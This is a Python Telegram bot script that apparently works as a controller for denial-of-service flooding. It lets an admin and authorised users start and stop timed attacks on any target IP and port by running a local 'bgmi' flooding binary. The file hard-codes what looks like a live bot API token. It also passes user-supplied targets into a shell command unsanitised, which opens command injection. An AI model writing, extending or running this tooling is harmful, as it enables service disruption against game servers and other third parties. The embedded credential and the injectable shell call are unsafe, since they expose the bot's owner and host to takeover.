import asyncio
import logging
import subprocess
import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command  # v3 filter

API_TOKEN = "8284145502:AAHZd3xCt-N0MkZRwYeU7tAoTEClIvoNu0c"
ADMIN_ID = 685652614

ALLOWED_USERS = {}
RUNNING_ATTACKS = {}
LAST_ATTACK = {}

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# --- Add User ---
@dp.message(Command("add"))
async def add_cmd(message: types.Message):
    if message.chat.id != ADMIN_ID:
        return await message.reply("❌ Only admin can add users.")
    parts = message.text.split()
    if len(parts) < 2 or not parts[1].isdigit():
        return await message.reply("Usage: /add <telegram_id>")
    ALLOWED_USERS[parts[1]] = str(datetime.datetime.now())
    await message.reply(f"✅ User {parts[1]} added.")

# --- Remove User ---
@dp.message(Command("remove"))
async def remove_cmd(message: types.Message):
    if message.chat.id != ADMIN_ID:
        return await message.reply("❌ Not authorized.")
    parts = message.text.split()
    if len(parts) < 2:
        return await message.reply("Usage: /remove <id>")
    user_to_remove = parts[1]
    if user_to_remove in ALLOWED_USERS:
        del ALLOWED_USERS[user_to_remove]
        await message.reply(f"✅ User {user_to_remove} removed.")
    else:
        await message.reply("⚠️ User not found.")

# --- Start Attack ---
@dp.message(Command("startbgmi"))
async def startbgmi_cmd(message: types.Message):
    user_id = str(message.chat.id)
    if user_id not in ALLOWED_USERS and message.chat.id != ADMIN_ID:
        return await message.reply("🚫 Unauthorized Access.")

    parts = message.text.split()
    if len(parts) != 4:
        return await message.reply("Usage: /startbgmi <target> <port> <time>")

    target, port, seconds = parts[1], parts[2], parts[3]

    if not port.isdigit() or not (1 <= int(port) <= 65535):
        return await message.reply("⚠️ Invalid port.")
    if not seconds.isdigit() or not (1 <= int(seconds) <= 600):
        return await message.reply("⚠️ Invalid time. Max 600s.")

    if user_id in RUNNING_ATTACKS:
        return await message.reply("⚠️ You already have a running attack. Use /stopbgmi first.")

    try:
        full_command = f"./bgmi {target} {port} {seconds} 500"
        process = subprocess.Popen(full_command, shell=True)
        RUNNING_ATTACKS[user_id] = {
            "process": process,
            "target": target,
            "port": port,
            "time": seconds,
            "started": str(datetime.datetime.now())
        }
        LAST_ATTACK[user_id] = RUNNING_ATTACKS[user_id]
        await message.reply(f"🔥 Attack started on {target}:{port} for {seconds}s")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

# --- Stop Attack ---
@dp.message(Command("stopbgmi"))
async def stopbgmi_cmd(message: types.Message):
    user_id = str(message.chat.id)
    if user_id not in RUNNING_ATTACKS and message.chat.id != ADMIN_ID:
        return await message.reply("⚠️ No running attack to stop.")

    if message.chat.id == ADMIN_ID:
        stopped = []
        for uid, info in list(RUNNING_ATTACKS.items()):
            info["process"].terminate()
            stopped.append(uid)
            del RUNNING_ATTACKS[uid]
        return await message.reply(f"✅ Admin stopped attacks for: {', '.join(stopped)}")

    info = RUNNING_ATTACKS.get(user_id)
    if info:
        info["process"].terminate()
        del RUNNING_ATTACKS[user_id]
        await message.reply("✅ Your attack stopped.")
    else:
        await message.reply("⚠️ No attack found.")

# --- Status ---
@dp.message(Command("status"))
async def status_cmd(message: types.Message):
    user_id = str(message.chat.id)
    role = "Admin" if message.chat.id == ADMIN_ID else ("User" if user_id in ALLOWED_USERS else "Guest")
    added = ALLOWED_USERS.get(user_id, "N/A")
    running = RUNNING_ATTACKS.get(user_id)
    last = LAST_ATTACK.get(user_id)

    response = f"👤 ID: {user_id}\n🔖 Role: {role}\n📅 Added: {added}"

    if running:
        response += (
            f"\n\n⚡ Running Attack:\n🎯 {running['target']}"
            f"\n🔌 Port: {running['port']}"
            f"\n⏱ Time: {running['time']}s"
            f"\n📅 Started: {running['started']}"
        )
    elif last:
        response += (
            f"\n\n📝 Last Attack:\n🎯 {last['target']}"
            f"\n🔌 Port: {last['port']}"
            f"\n⏱ Time: {last['time']}s"
            f"\n📅 Started: {last['started']}"
        )

    await message.reply(response)

# --- Startup ---
async def on_startup():
    await bot.send_message(ADMIN_ID, "🚀 Bot started.")

async def on_shutdown():
    await bot.send_message(ADMIN_ID, "⚠️ Bot stopped.")

if __name__ == "__main__":
    try:
        asyncio.run(dp.start_polling(bot, on_startup=on_startup, on_shutdown=on_shutdown))
    except Exception as e:
        logging.error("Bot crashed: %s", e)
